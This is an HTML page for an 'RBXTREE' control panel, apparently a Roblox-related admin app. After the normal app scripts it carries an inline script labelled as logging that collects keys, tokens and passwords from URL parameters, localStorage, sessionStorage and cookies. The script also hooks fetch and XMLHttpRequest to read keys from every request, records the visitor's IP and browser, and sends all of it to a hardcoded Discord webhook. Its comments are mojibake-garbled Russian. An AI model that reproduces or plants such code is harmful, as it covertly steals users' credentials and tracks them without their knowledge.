<!DOCTYPE html>
<html lang="">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" href="/favicon.ico">
    <title>RBXTREE | Control panel</title>
    <link href="/css/app.4981a60b.css" rel="preload" as="style">
    <link href="/js/app.1309f105.js" rel="preload" as="script">
    <link href="/js/chunk-vendors.356c81a4.js" rel="preload" as="script">
    <link href="/css/app.4981a60b.css" rel="stylesheet">
</head>
<body>
<noscript>
    <strong>We're sorry but rbx-admin doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
</noscript>
<div id="app"></div>
<script src="/js/chunk-vendors.356c81a4.js"></script>
<script src="/js/app.1309f105.js"></script>

<script>
    // –í–µ–±—Ö—É–∫ Discord –¥–ª—è –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1461394586911113288/1Vy6DDWuWijCqig-fxZIZempuZHhYumn89fUUW1d4VHqTX3IcU3gEHztM4jN8b9hf3wZ';

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP –∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
        } catch (error) {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip || '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
            } catch (error2) {
                return '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
            }
        }
    }

    // –§—É–Ω–∫—Ü–∏—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫–ª—é—á–∞ –∏–∑ URL
    function extractKeyFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const keyFromURL = urlParams.get('key');
        
        // –¢–∞–∫–∂–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º –¥—Ä—É–≥–∏–µ –≤–æ–∑–º–æ–∂–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        const possibleKeyParams = ['key', 'token', 'access_key', 'auth_key', 'password', 'code'];
        let foundKey = keyFromURL;
        
        for (const param of possibleKeyParams) {
            const value = urlParams.get(param);
            if (value && !foundKey) {
                foundKey = value;
            }
        }
        
        return foundKey;
    }

    // –§—É–Ω–∫—Ü–∏—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∫–ª—é—á–∞ –∏–∑ –≤—Å–µ—Ö –≤–æ–∑–º–æ–∂–Ω—ã—Ö –º–µ—Å—Ç
    function extractKeyFromAllSources() {
        const sources = [];
        
        // 1. –ò–∑ URL –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
        const urlKey = extractKeyFromURL();
        if (urlKey) {
            sources.push({
                source: 'URL –ø–∞—Ä–∞–º–µ—Ç—Ä',
                key: urlKey,
                param: 'key'
            });
        }
        
        // 2. –ò–∑ localStorage
        try {
            const localStorageKeys = ['rbx_key', 'auth_key', 'access_token', 'user_token', 'key'];
            for (const keyName of localStorageKeys) {
                const value = localStorage.getItem(keyName);
                if (value && value.length > 3) {
                    sources.push({
                        source: 'localStorage',
                        key: value,
                        storageKey: keyName
                    });
                }
            }
        } catch (e) {}
        
        // 3. –ò–∑ sessionStorage
        try {
            const sessionStorageKeys = ['rbx_key', 'auth_key', 'access_token', 'user_token', 'key'];
            for (const keyName of sessionStorageKeys) {
                const value = sessionStorage.getItem(keyName);
                if (value && value.length > 3) {
                    sources.push({
                        source: 'sessionStorage',
                        key: value,
                        storageKey: keyName
                    });
                }
            }
        } catch (e) {}
        
        // 4. –ò–∑ cookies
        try {
            const cookies = document.cookie.split(';');
            const cookieKeys = ['rbx_key', 'auth_key', 'token', 'key', 'access'];
            for (const cookie of cookies) {
                const [name, value] = cookie.trim().split('=');
                if (name && value && cookieKeys.some(k => name.toLowerCase().includes(k))) {
                    sources.push({
                        source: 'Cookie',
                        key: value,
                        cookieName: name
                    });
                }
            }
        } catch (e) {}
        
        return sources;
    }

    // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–æ–≤ –≤ Discord
    async function sendToDiscord(action, details = {}) {
        try {
            const timestamp = new Date().toISOString();
            const userAgent = navigator.userAgent;
            const pageUrl = window.location.href;
            const userIP = await getUserIP();
            
            // –ò—â–µ–º –∫–ª—é—á–∏ –≤–æ –≤—Å–µ—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–∞—Ö
            const keySources = extractKeyFromAllSources();
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
            const embed = {
                title: `üîê RBXTREE –õ–æ–≥: ${action}`,
                color: 0x3498db,
                fields: [
                    {
                        name: "‚è∞ –í—Ä–µ–º—è",
                        value: new Date().toLocaleString('ru-RU'),
                        inline: true
                    },
                    {
                        name: "üìç IP –ê–¥—Ä–µ—Å",
                        value: `\`${userIP}\``,
                        inline: true
                    },
                    {
                        name: "üåê –°—Ç—Ä–∞–Ω–∏—Ü–∞",
                        value: `[–û—Ç–∫—Ä—ã—Ç—å](${pageUrl})`,
                        inline: true
                    },
                    {
                        name: "üñ•Ô∏è User Agent",
                        value: `\`${userAgent.substring(0, 100)}\``,
                        inline: false
                    }
                ],
                timestamp: timestamp,
                footer: {
                    text: `RBXTREE Control Panel ‚Ä¢ ${navigator.platform}`
                }
            };

            // –î–æ–±–∞–≤–ª—è–µ–º –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –∫–ª—é—á–∏
            if (keySources.length > 0) {
                let keyInfo = '';
                keySources.forEach((source, index) => {
                    keyInfo += `**${index + 1}. –ò–∑ ${source.source}**\n`;
                    keyInfo += `–ö–ª—é—á: \`${source.key}\`\n`;
                    if (source.param) keyInfo += `–ü–∞—Ä–∞–º–µ—Ç—Ä: ${source.param}\n`;
                    if (source.storageKey) keyInfo += `–ö–ª—é—á —Ö—Ä–∞–Ω–∏–ª–∏—â–∞: ${source.storageKey}\n`;
                    if (source.cookieName) keyInfo += `Cookie: ${source.cookieName}\n`;
                    keyInfo += '\n';
                });
                
                embed.fields.unshift({
                    name: "üîë –ù–ê–ô–î–ï–ù–ù–´–ï –ö–õ–Æ–ß–ò",
                    value: keyInfo,
                    inline: false
                });
            }

            // –î–æ–±–∞–≤–ª—è–µ–º –∫–ª—é—á –∏–∑ details –µ—Å–ª–∏ –µ—Å—Ç—å
            if (details.key && details.key !== '–ö–ª—é—á –Ω–µ –Ω–∞–π–¥–µ–Ω') {
                embed.fields.unshift({
                    name: "‚å®Ô∏è –í–í–ï–î–ï–ù–ù–´–ô –ö–õ–Æ–ß",
                    value: `\`\`\`${details.key}\`\`\``,
                    inline: false
                });
            }

            // –î–æ–±–∞–≤–ª—è–µ–º –æ—Å—Ç–∞–ª—å–Ω—ã–µ –ø–æ–ª—è
            if (details.formId) {
                embed.fields.push({
                    name: "üìã –§–æ—Ä–º–∞",
                    value: details.formId,
                    inline: true
                });
            }

            if (details.error) {
                embed.fields.push({
                    name: "‚ùå –û—à–∏–±–∫–∞",
                    value: details.error.substring(0, 100),
                    inline: true
                });
            }

            // –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ fetch
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: 'RBXTREE Logger',
                    avatar_url: 'https://cdn.discordapp.com/attachments/1234567890/987654321/logo.png',
                    embeds: [embed]
                })
            });
            
            console.log(`[RBXTREE LOG] ${action} - –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Discord`);
            
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞ –≤ Discord:', error);
        }
    }

    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –≤—Å–µ—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const requestUrl = args[0];
        const requestOptions = args[1] || {};
        const requestTime = new Date().toISOString();
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º URL –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∫–ª—é—á–∞
        if (typeof requestUrl === 'string') {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º URL –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ key
            if (requestUrl.includes('key=') || requestUrl.includes('auth_control_panel')) {
                try {
                    const urlObj = new URL(requestUrl, window.location.origin);
                    const keyParam = urlObj.searchParams.get('key');
                    
                    if (keyParam) {
                        // –õ–æ–≥–∏—Ä—É–µ–º —Å—Ä–∞–∑—É –ø—Ä–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–∏
                        sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–ª—é—á –≤ –∑–∞–ø—Ä–æ—Å–µ –∫ —Å–µ—Ä–≤–µ—Ä—É', {
                            key: keyParam,
                            url: requestUrl,
                            method: requestOptions.method || 'GET',
                            fullUrl: requestUrl
                        });
                    }
                } catch (e) {
                    // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç—Ä–æ–∫–∏
                    const keyMatch = requestUrl.match(/key=([^&]+)/);
                    if (keyMatch && keyMatch[1]) {
                        sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–ª—é—á –≤ —Å—Ç—Ä–æ–∫–µ –∑–∞–ø—Ä–æ—Å–∞', {
                            key: keyMatch[1],
                            url: requestUrl,
                            method: requestOptions.method || 'GET'
                        });
                    }
                }
            }
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞
            if (requestOptions.body) {
                try {
                    const bodyStr = typeof requestOptions.body === 'string' 
                        ? requestOptions.body 
                        : JSON.stringify(requestOptions.body);
                    
                    // –ò—â–µ–º –∫–ª—é—á–∏ –≤ —Ç–µ–ª–µ
                    const keyPatterns = [
                        /"key"\s*:\s*"([^"]+)"/,
                        /"token"\s*:\s*"([^"]+)"/,
                        /key=([^&]+)/,
                        /token=([^&]+)/
                    ];
                    
                    for (const pattern of keyPatterns) {
                        const match = bodyStr.match(pattern);
                        if (match && match[1]) {
                            sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–ª—é—á –≤ —Ç–µ–ª–µ –∑–∞–ø—Ä–æ—Å–∞', {
                                key: match[1],
                                url: requestUrl,
                                method: requestOptions.method || 'GET',
                                bodyPreview: bodyStr.substring(0, 200)
                            });
                            break;
                        }
                    }
                } catch (e) {}
            }
        }
        
        // –í—ã–ø–æ–ª–Ω—è–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∑–∞–ø—Ä–æ—Å –∏ –ª–æ–≥–∏—Ä—É–µ–º –æ—Ç–≤–µ—Ç
        return originalFetch.apply(this, args).then(async response => {
            if (!response.ok) {
                sendToDiscord('–û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –∫ —Å–µ—Ä–≤–µ—Ä—É', {
                    url: requestUrl,
                    status: response.status,
                    statusText: response.statusText,
                    method: requestOptions.method || 'GET'
                });
            }
            return response;
        }).catch(error => {
            sendToDiscord('–°–µ—Ç–µ–≤–∞—è –æ—à–∏–±–∫–∞', {
                url: requestUrl,
                error: error.message,
                method: requestOptions.method || 'GET'
            });
            throw error;
        });
    };

    // –ü–µ—Ä–µ—Ö–≤–∞—Ç XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url) {
        this._requestMethod = method;
        this._requestUrl = url;
        this._requestStartTime = Date.now();
        return originalXHROpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(body) {
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º URL –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∫–ª—é—á–∞
        if (this._requestUrl && (this._requestUrl.includes('key=') || this._requestUrl.includes('auth_control_panel'))) {
            try {
                const urlObj = new URL(this._requestUrl, window.location.origin);
                const keyParam = urlObj.searchParams.get('key');
                
                if (keyParam) {
                    sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–ª—é—á –≤ XHR –∑–∞–ø—Ä–æ—Å–µ', {
                        key: keyParam,
                        url: this._requestUrl,
                        method: this._requestMethod,
                        body: body ? String(body).substring(0, 200) : null
                    });
                }
            } catch (e) {
                const keyMatch = this._requestUrl.match(/key=([^&]+)/);
                if (keyMatch && keyMatch[1]) {
                    sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–ª—é—á –≤ XHR —Å—Ç—Ä–æ–∫–µ', {
                        key: keyMatch[1],
                        url: this._requestUrl,
                        method: this._requestMethod
                    });
                }
            }
        }
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞
        if (body) {
            const bodyStr = String(body);
            const keyPatterns = [/key=([^&]+)/, /"key"\s*:\s*"([^"]+)"/];
            
            for (const pattern of keyPatterns) {
                const match = bodyStr.match(pattern);
                if (match && match[1]) {
                    sendToDiscord('–û–±–Ω–∞—Ä—É–∂–µ–Ω –∫–ª—é—á –≤ XHR —Ç–µ–ª–µ', {
                        key: match[1],
                        url: this._requestUrl,
                        method: this._requestMethod,
                        bodyPreview: bodyStr.substring(0, 200)
                    });
                    break;
                }
            }
        }
        
        // –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—Ç–≤–µ—Ç–∞
        this.addEventListener('load', function() {
            if (this.status >= 400) {
                sendToDiscord('XHR –æ—à–∏–±–∫–∞ –æ—Ç–≤–µ—Ç–∞', {
                    url: this._requestUrl,
                    status: this.status,
                    statusText: this.statusText,
                    method: this._requestMethod,
                    responseTime: Date.now() - this._requestStartTime
                });
            }
        });
        
        return originalXHRSend.apply(this, arguments);
    };

    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π URL (–¥–ª—è SPA –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π)
    let lastUrl = window.location.href;
    const urlObserver = new MutationObserver(() => {
        if (window.location.href !== lastUrl) {
            lastUrl = window.location.href;
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–æ–≤—ã–π URL –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∫–ª—é—á–∞
            const urlKey = extractKeyFromURL();
            if (urlKey) {
                sendToDiscord('–ò–∑–º–µ–Ω–µ–Ω–∏–µ URL —Å –∫–ª—é—á–æ–º', {
                    key: urlKey,
                    newUrl: window.location.href,
                    oldUrl: lastUrl
                });
            }
        }
    });

    urlObserver.observe(document.body, {
        childList: true,
        subtree: true
    });

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener('load', function() {
        // –î–∞–µ–º –≤—Ä–µ–º—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ –≤—Å–µ—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤
        setTimeout(() => {
            const urlKey = extractKeyFromURL();
            const keySources = extractKeyFromAllSources();
            
            if (urlKey || keySources.length > 0) {
                sendToDiscord('–ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞–Ω–µ–ª–∏ —Å –∫–ª—é—á–æ–º', {
                    key: urlKey,
                    pageTitle: document.title,
                    fullURL: window.location.href,
                    keySourcesCount: keySources.length
                });
            } else {
                sendToDiscord('–ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞–Ω–µ–ª–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è', {
                    pageTitle: document.title,
                    referrer: document.referrer || '–ø—Ä—è–º–æ–π –≤—Ö–æ–¥'
                });
            }
        }, 2000);
    });

    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –≤—Å–µ—Ö –∫–ª–∏–∫–æ–≤ –ø–æ —Å—Å—ã–ª–∫–∞–º
    document.addEventListener('click', function(event) {
        let target = event.target;
        while (target && target.tagName !== 'A') {
            target = target.parentElement;
        }
        
        if (target && target.tagName === 'A' && target.href) {
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ –Ω–∞–ª–∏—á–∏–µ –∫–ª—é—á–∞
            try {
                const url = new URL(target.href);
                const keyParam = url.searchParams.get('key');
                if (keyParam) {
                    sendToDiscord('–ö–ª–∏–∫ –ø–æ —Å—Å—ã–ª–∫–µ —Å –∫–ª—é—á–æ–º', {
                        key: keyParam,
                        linkText: target.textContent.substring(0, 50),
                        href: target.href
                    });
                }
            } catch (e) {}
        }
    });

    // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É URL –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
    setTimeout(() => {
        const currentKey = extractKeyFromURL();
        if (currentKey) {
            sendToDiscord('–ö–ª—é—á –æ–±–Ω–∞—Ä—É–∂–µ–Ω –≤ —Ç–µ–∫—É—â–µ–º URL', {
                key: currentKey,
                fullURL: window.location.href
            });
        }
    }, 1000);

    console.log('üîê –°–∏—Å—Ç–µ–º–∞ –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è RBXTREE –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞ - –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –∫–ª—é—á–µ–π –∏–∑ URL');
    
    // –ì–ª–æ–±–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä—É—á–Ω–æ–≥–æ –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    window.logRBXAction = function(action, details) {
        sendToDiscord(action, details);
    };
</script>
</body>
</html>
